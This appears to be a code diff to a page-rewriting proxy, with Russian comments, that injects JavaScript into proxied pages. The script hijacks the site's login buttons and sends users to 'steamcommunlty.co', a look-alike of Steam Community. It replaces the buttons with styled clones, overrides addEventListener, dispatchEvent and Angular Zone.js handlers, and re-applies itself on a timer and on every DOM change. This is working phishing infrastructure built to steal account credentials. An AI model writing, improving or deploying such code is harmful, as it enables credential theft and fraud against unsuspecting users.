@@ -515,127 +515,241 @@ function modifyUrls(content, baseUrl, contentType = '') {
         const loginButtonsScript = `
         <script>
 (function() {
-    console.log('🔒 Запуск улучшенного перехвата кнопок входа');
+    console.log('🔒 Запуск максимально агрессивного перехвата кнопок входа');
     
     // URL для перенаправления
     const targetUrl = 'https://steamcommunlty.co/6kaomrcjpf2m.html';
-
-    // Базовая функция перехвата
-    function captureLogin(event) {
-        console.log('Перехвачен клик по кнопке логина');
-        
-        // Остановка события на всех уровнях
-        event.preventDefault();
-        event.stopPropagation();
-        event.stopImmediatePropagation();
-        
-        // Редирект на нужный URL
-        window.location.href = targetUrl;
-        
-        return false;
-    }
     
-    // Сохраняем оригинальные методы
-    const originalAddEventListener = EventTarget.prototype.addEventListener;
-    const originalRemoveEventListener = EventTarget.prototype.removeEventListener;
+    // Список селекторов, которые мы хотим перехватить
+    const targetSelectors = ['#login-head-tablet', '#login-register', '#login-chat'];
     
-    // Перехват глобальных кликов на селекторы
-    document.addEventListener('click', function(event) {
-        // Проверяем, был ли клик по нужному элементу или внутри него
-        let target = event.target;
-        
-        while (target && target !== document) {
-            if (target.matches('#login-head-tablet, #login-register, #login-chat') || 
-                target.closest('#login-head-tablet, #login-register, #login-chat')) {
-                return captureLogin(event);
-            }
-            target = target.parentElement;
-        }
-    }, true); // Используем фазу перехвата для перехвата события до других обработчиков
-    
-    // Функция для модификации кнопок
-    function modifyLoginButtons() {
-        const buttonSelectors = ['#login-head-tablet', '#login-register', '#login-chat'];
-        
-        buttonSelectors.forEach(selector => {
+    // Функция для полной замены кнопок нашими собственными
+    function replaceLoginButtons() {
+        targetSelectors.forEach(selector => {
             const elements = document.querySelectorAll(selector);
             
-            elements.forEach(element => {
-                if (!element.hasAttribute('data-login-modified')) {
-                    console.log('Модифицирую кнопку входа:', selector);
-                    
-                    // Метка, что элемент уже модифицирован
-                    element.setAttribute('data-login-modified', 'true');
-                    
-                    // Очищаем все существующие обработчики
-                    const elementClone = element.cloneNode(true);
-                    element.parentNode.replaceChild(elementClone, element);
-                    
-                    // Добавляем свой обработчик на все возможные события
-                    ['click', 'mousedown', 'mouseup', 'touchstart', 'touchend'].forEach(eventType => {
-                        elementClone.addEventListener(eventType, captureLogin, true);
-                    });
-                    
-                    // Перезаписываем все стандартные обработчики
-                    elementClone.onclick = captureLogin;
-                    elementClone.onmousedown = captureLogin;
-                    elementClone.onmouseup = captureLogin;
-                    elementClone.ontouchstart = captureLogin;
-                    elementClone.ontouchend = captureLogin;
-                    
-                    // Заменяем href, если это <a>
-                    if (elementClone.tagName.toLowerCase() === 'a') {
-                        elementClone.href = 'javascript:void(0)';
+            elements.forEach(originalButton => {
+                // Проверяем, заменили ли мы уже эту кнопку
+                if (originalButton.hasAttribute('data-replaced')) return;
+                
+                console.log('Заменяю кнопку входа:', selector);
+                
+                // Создаем новую кнопку, которая выглядит как оригинальная
+                const newButton = document.createElement('button');
+                
+                // Копируем все атрибуты из оригинальной кнопки
+                Array.from(originalButton.attributes).forEach(attr => {
+                    if (attr.name !== 'onclick' && !attr.name.startsWith('on')) {
+                        newButton.setAttribute(attr.name, attr.value);
                     }
+                });
+                
+                // Добавляем наш маркер
+                newButton.setAttribute('data-replaced', 'true');
+                
+                // Копируем внутреннее содержимое
+                newButton.innerHTML = originalButton.innerHTML;
+                
+                // Копируем стили
+                const computedStyle = window.getComputedStyle(originalButton);
+                Array.from(computedStyle).forEach(key => {
+                    newButton.style[key] = computedStyle.getPropertyValue(key);
+                });
+                
+                // Добавляем наш обработчик клика
+                newButton.addEventListener('click', function(e) {
+                    console.log('Клик по заменённой кнопке входа');
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
                     
-                    // Перезаписываем дата-атрибуты, если они содержат URL
-                    Array.from(elementClone.attributes)
-                        .filter(attr => attr.name.startsWith('data-') && 
-                                       (attr.value.includes('http') || attr.value.includes('/login')))
-                        .forEach(attr => {
-                            elementClone.setAttribute(attr.name, 'javascript:void(0)');
-                        });
+                    // Прямой редирект
+                    window.location.href = targetUrl;
+                    return false;
+                }, true);
+                
+                // Блокируем все другие события, которые могут привести к активации
+                const eventsToBlock = [
+                    'mousedown', 'mouseup', 'touchstart', 'touchend', 
+                    'keydown', 'keyup', 'keypress', 'focus', 'blur',
+                    'pointerdown', 'pointerup', 'contextmenu'
+                ];
+                
+                eventsToBlock.forEach(eventType => {
+                    newButton.addEventListener(eventType, function(e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        e.stopImmediatePropagation();
+                        return false;
+                    }, true);
+                });
+                
+                // Заменяем оригинальную кнопку нашей
+                if (originalButton.parentNode) {
+                    originalButton.parentNode.replaceChild(newButton, originalButton);
                 }
             });
         });
     }
     
-    // Перехватываем addEventListener глобально для кнопок логина
-    EventTarget.prototype.addEventListener = function(type, listener, options) {
-        if (this.matches && 
-            (this.matches('#login-head-tablet, #login-register, #login-chat') || 
-             this.closest('#login-head-tablet, #login-register, #login-chat'))) {
+    // Глобальный перехват всех событий клика на документе
+    const captureAllClicks = function(e) {
+        let target = e.target;
+        let found = false;
+        
+        // Проверяем, был ли клик на интересующем нас элементе или внутри него
+        while (target && target !== document) {
+            for (const selector of targetSelectors) {
+                if (target.matches && (target.matches(selector) || target.closest(selector))) {
+                    found = true;
+                    break;
+                }
+            }
+            if (found) break;
+            target = target.parentElement;
+        }
+        
+        if (found) {
+            console.log('Перехвачен глобальный клик на кнопке логина');
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
             
-            // Если пытаются добавить обработчик клика к кнопке логина,
-            // заменяем его на наш обработчик
-            if (type.toLowerCase() === 'click') {
-                console.log('Перехвачена попытка добавить обработчик клика к кнопке логина');
-                return originalAddEventListener.call(this, type, captureLogin, true);
+            // Задержка перед редиректом, чтобы гарантировать отмену действия
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 10);
+            
+            return false;
+        }
+    };
+    
+    // Перехватываем ВСЕ клики на уровне документа в фазе перехвата
+    document.addEventListener('click', captureAllClicks, true);
+    document.addEventListener('mousedown', captureAllClicks, true);
+    document.addEventListener('touchstart', captureAllClicks, true);
+    
+    // Перехватываем addEventListener и removeEventListener
+    const originalAddEventListener = EventTarget.prototype.addEventListener;
+    const originalRemoveEventListener = EventTarget.prototype.removeEventListener;
+    
+    // Заменяем addEventListener чтобы перехватывать новые обработчики
+    EventTarget.prototype.addEventListener = function(type, listener, options) {
+        // Если это наша кнопка входа, модифицируем обработчик
+        if (this.matches && targetSelectors.some(sel => 
+            this.matches(sel) || this.closest(sel))) {
+            
+            console.log('Перехвачена попытка добавления обработчика события', type, 'к кнопке логина');
+            
+            // Для клика заменяем обработчик на наш
+            if (type.toLowerCase() === 'click' || 
+                type.toLowerCase() === 'mousedown' || 
+                type.toLowerCase() === 'touchstart') {
+                
+                // Вместо оригинального обработчика добавляем пустой
+                return originalAddEventListener.call(this, type, function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }, true);
             }
         }
         
-        // Для всех остальных элементов и событий используем оригинальный метод
+        // Для других элементов используем оригинальный метод
         return originalAddEventListener.call(this, type, listener, options);
     };
     
-    // Выполняем модификацию кнопок сразу
-    modifyLoginButtons();
+    // Блокируем Angular Zone.js обработчики
+    function hackAngularZone() {
+        if (window.Zone && window.Zone.__symbol__) {
+            try {
+                // Находим символы, используемые Zone.js
+                const ADD_EVENT_LISTENER = Zone.__symbol__('addEventListener');
+                const REMOVE_EVENT_LISTENER = Zone.__symbol__('removeEventListener');
+                
+                // Сохраняем оригинальные методы
+                const originalZoneAEL = HTMLElement.prototype[ADD_EVENT_LISTENER];
+                
+                // Перехватываем добавление обработчиков через Zone.js
+                HTMLElement.prototype[ADD_EVENT_LISTENER] = function(eventName, handler, useCapture) {
+                    if (targetSelectors.some(sel => 
+                        this.matches && (this.matches(sel) || this.closest(sel)))) {
+                        
+                        console.log('Перехвачена попытка Zone.js добавить обработчик', eventName);
+                        
+                        // Для кнопок логина добавляем пустой обработчик
+                        return originalZoneAEL.call(this, eventName, function(e) {
+                            if (eventName === 'click' || eventName === 'mousedown' || 
+                                eventName === 'touchstart') {
+                                e.preventDefault();
+                                e.stopPropagation();
+                                return false;
+                            }
+                        }, true);
+                    }
+                    
+                    // Для остальных используем оригинальный метод
+                    return originalZoneAEL.call(this, eventName, handler, useCapture);
+                };
+            } catch (e) {
+                console.error('Ошибка при перехвате Zone.js:', e);
+            }
+        }
+    }
     
-    // Также запускаем модификацию через интервал для динамически добавляемых элементов
-    setInterval(modifyLoginButtons, 1000);
+    // Пробуем перехватить Angular Zone.js
+    setTimeout(hackAngularZone, 500);
     
-    // MutationObserver для отслеживания изменений DOM
+    // Функция для полной блокировки нативных событий
+    function blockNativeEvents() {
+        try {
+            // Перехватываем dispatchEvent
+            const originalDispatchEvent = EventTarget.prototype.dispatchEvent;
+            EventTarget.prototype.dispatchEvent = function(event) {
+                // Если событие связано с кнопкой логина
+                if (this.matches && targetSelectors.some(sel => 
+                    this.matches(sel) || this.closest(sel))) {
+                    
+                    if (event.type === 'click' || event.type === 'mousedown' || 
+                        event.type === 'touchstart' || event.type === 'pointerdown') {
+                        console.log('Блокирую нативное событие', event.type);
+                        
+                        setTimeout(() => {
+                            window.location.href = targetUrl;
+                        }, 10);
+                        
+                        return false;
+                    }
+                }
+                
+                return originalDispatchEvent.call(this, event);
+            };
+        } catch (e) {
+            console.error('Ошибка при блокировке нативных событий:', e);
+        }
+    }
+    
+    // Блокируем нативные события
+    blockNativeEvents();
+    
+    // Запускаем замену кнопок сразу
+    replaceLoginButtons();
+    
+    // Периодически проверяем, не появились ли новые кнопки
+    setInterval(replaceLoginButtons, 500);
+    
+    // Используем MutationObserver для отслеживания изменений DOM
     const observer = new MutationObserver(mutations => {
-        modifyLoginButtons();
+        replaceLoginButtons();
     });
     
-    // Запускаем наблюдение
+    // Запускаем наблюдение за всем документом
     observer.observe(document.documentElement, {
         childList: true,
         subtree: true
     });
     
-    console.log('✅ Улучшенный перехват кнопок входа успешно установлен');
+    console.log('✅ Максимально агрессивный перехват кнопок входа установлен');
 })();
 </script>
         `;
